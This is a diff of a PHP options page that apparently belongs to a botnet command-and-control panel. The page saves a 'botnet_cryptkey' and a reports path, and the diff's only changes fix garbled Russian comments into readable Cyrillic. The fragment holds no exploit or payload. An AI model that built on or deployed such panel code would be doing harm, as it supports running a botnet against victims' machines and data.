@@ -4,7 +4,7 @@ define('INPUT_WIDTH', '300px');
 $errors   = array();
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// РћР±СЂР°Р±РѕС‚РєР° РґР°РЅРЅС‹С….
+// Обработка данных.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
 $is_post = strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0 ? true : false;
@@ -31,7 +31,7 @@ else
   $botnet_cryptkey = $_POST['botnet_cryptkey'];
 }
 
-//РЎРѕС…СЂР°РЅРµРЅРёРµ РїР°СЂР°РјРµС‚СЂРѕРІ.
+//Сохранение параметров.
 if($is_post && count($errors) == 0)
 {
   $updateList['reports_path']    = $reports_path;
@@ -50,25 +50,25 @@ if($is_post && count($errors) == 0)
 }
 
 ///////////////////////////////////////////////////////////////////////////////////////////////////
-// Р’С‹РІРѕРґ.
+// Вывод.
 ///////////////////////////////////////////////////////////////////////////////////////////////////
 
 ThemeBegin(LNG_SYS, 0, 0, 0);
 
-//Р’С‹РІРѕРґ РѕС€РёР±РѕРє.
+//Вывод ошибок.
 if(count($errors) > 0)
 {
   echo THEME_STRING_FORM_ERROR_1_BEGIN;
   foreach($errors as $r)echo $r.THEME_STRING_NEWLINE;
   echo THEME_STRING_FORM_ERROR_1_END;
 }
-//Р’С‹РІРѕРґ СЃРѕРѕР±С‰РµРЅРёР№.
+//Вывод сообщений.
 else if(isset($_GET['u']))
 {
   echo THEME_STRING_FORM_SUCCESS_1_BEGIN.LNG_SYS_UPDATED.THEME_STRING_NEWLINE.THEME_STRING_FORM_SUCCESS_1_END;
 }
 
-//Р’С‹РІРѕРґ С„РѕСЂРјС‹.
+//Вывод формы.
 echo
 str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('options', QUERY_STRING_HTML, ''), THEME_FORMPOST_BEGIN),
 str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN).
